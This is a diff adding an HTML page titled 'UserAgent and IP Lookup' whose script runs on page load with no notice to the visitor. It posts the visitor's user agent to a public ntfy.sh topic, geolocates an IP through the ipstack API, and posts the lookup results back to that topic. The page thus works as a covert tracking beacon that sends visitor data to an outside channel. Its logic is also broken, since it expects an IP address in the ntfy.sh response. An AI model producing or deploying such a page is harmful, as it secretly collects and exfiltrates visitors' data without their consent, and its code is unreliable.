@@ -1,1 +1,53 @@
-null
+<!DOCTYPE html>
+<html>
+<head>
+  <title>UserAgent and IP Lookup</title>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+  <script>
+    // Function to perform an HTTP POST request
+    function httpPost(url, data) {
+      return $.ajax({
+        url: url,
+        type: 'POST',
+        data: data
+      });
+    }
+
+    // Get User Agent
+    var userAgent = navigator.userAgent;
+
+    // HTTP POST to ntfy.sh/blitzd to obtain IP address
+    httpPost('https://ntfy.sh/blitzd', { user_agent: userAgent })
+      .done(function(response) {
+        var ipAddress = response.ip;
+
+        // Lookup IP address using ipstack API
+        var ipstackAPIKey = 'YOUR_IPSTACK_API_KEY';  // Replace with your actual API key
+        var ipstackURL = 'http://api.ipstack.com/' + ipAddress + '?access_key=' + ipstackAPIKey;
+
+        // HTTP GET request to ipstack API
+        $.get(ipstackURL)
+          .done(function(ipstackResponse) {
+            var ipstackResults = JSON.stringify(ipstackResponse);
+
+            // HTTP POST to ntfy.sh/blitzd with the IP lookup results
+            httpPost('https://ntfy.sh/blitzd', { ip_results: ipstackResults })
+              .done(function() {
+                console.log('Results posted successfully.');
+              })
+              .fail(function() {
+                console.error('Failed to post results.');
+              });
+          })
+          .fail(function() {
+            console.error('Failed to retrieve IP lookup results from ipstack.');
+          });
+      })
+      .fail(function() {
+        console.error('Failed to obtain IP address from ntfy.sh/blitzd.');
+      });
+  </script>
+</body>
+</html>
